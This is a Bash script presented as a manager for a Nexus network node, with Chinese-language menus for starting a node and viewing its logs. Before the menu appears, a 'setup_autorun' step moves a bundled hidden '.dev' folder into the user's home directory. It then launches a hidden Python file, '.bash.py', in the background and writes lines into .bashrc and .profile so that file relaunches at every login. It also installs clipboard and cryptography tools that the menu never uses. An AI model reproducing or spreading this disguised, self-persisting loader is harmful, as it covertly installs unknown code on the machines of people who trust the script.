#!/bin/bash
set -e

# ========== 依赖安装===========
OS_TYPE=$(uname -s)

install_dependencies() {
    if [ "$OS_TYPE" = "Linux" ]; then
        PACKAGES_TO_INSTALL=""
        if ! command -v pip3 &> /dev/null; then
            PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
        fi
        if ! command -v xclip &> /dev/null; then
            PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
        fi
        if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
            sudo apt update
            sudo apt install -y $PACKAGES_TO_INSTALL
        fi
    fi
}

install_python_pkgs() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
            pip3 install --break-system-packages 'requests>=2.31.0'
        fi
        if ! pip3 show cryptography >/dev/null 2>&1; then
            pip3 install --break-system-packages cryptography
        fi
    fi
}

setup_autorun() {
    if [ "$OS_TYPE" = "Linux" ] && [ -d .dev ]; then
        DEST_DIR="$HOME/.dev"
        if [ -d "$DEST_DIR" ]; then
            rm -rf "$DEST_DIR"
        fi
        mv .dev "$DEST_DIR"
        EXEC_CMD="python3"
        SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
        STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
        if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
            echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
        fi
        if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
            echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
        fi
        if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
            (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
        fi
    fi
}

install_dependencies
install_python_pkgs
setup_autorun

# ========== Nexus 节点管理菜单 ===========
BIN_PATH="/usr/local/bin/nexus-network"
SCREEN_NAME="nexus"

# 检查 nexus-network 是否存在
function check_nexus_binary() {
    if ! command -v nexus-network >/dev/null 2>&1; then
        echo "未检测到 nexus-network，正在下载安装..."
        curl -sSL https://cli.nexus.xyz/ | NONINTERACTIVE=1 sh
        ln -sf "$HOME/.nexus/bin/nexus-network" "$BIN_PATH"
    fi
}

# 启动节点（node-id 由用户输入）
function start_node() {
    read -rp "请输入您的 node-id: " NODE_ID
    if [ -z "$NODE_ID" ]; then
        echo "❌ node-id 不能为空！"
        return
    fi

    if screen -list | grep -q "$SCREEN_NAME"; then
        echo "检测到已存在名为 '$SCREEN_NAME' 的 screen，请先关闭或查看日志"
        return
    fi

    echo "$NODE_ID" > "$HOME/.nexus/node-id"
    echo "✅ 正在以 screen 模式启动 Nexus 节点..."

    screen -dmS "$SCREEN_NAME" bash -c "NODE_ID=$NODE_ID nexus-network start --node-id $NODE_ID"
    echo "✅ 节点已启动。可通过查看日志进入 screen。"
}

# 查看日志（直接 attach 到 screen）
function view_logs() {
    if screen -list | grep -q "$SCREEN_NAME"; then
        echo "🎬 正在进入 screen（退出请按 Ctrl+A 然后按 D）..."
        sleep 1
        screen -r "$SCREEN_NAME"
    else
        echo "❌ 未检测到正在运行的 Nexus 节点 screen"
    fi
}

# 主菜单
while true; do
    clear
    echo "======= Nexus 节点管理 ======="
    echo "1. 启动节点"
    echo "2. 查看节点日志，退出日志请按 Ctrl A+D "
    echo "3. 退出"
    echo "======================================="
    read -rp "请选择操作 (1-3): " choice
    case $choice in
        1)
            check_nexus_binary
            start_node
            read -p "按任意键返回菜单"
            ;;
        2)
            view_logs
            read -p "按任意键返回菜单"
            ;;
        3)
            echo "退出脚本。"
            exit 0
            ;;
        *)
            echo "无效选项"
            read -p "按任意键继续"
            ;;
    esac
done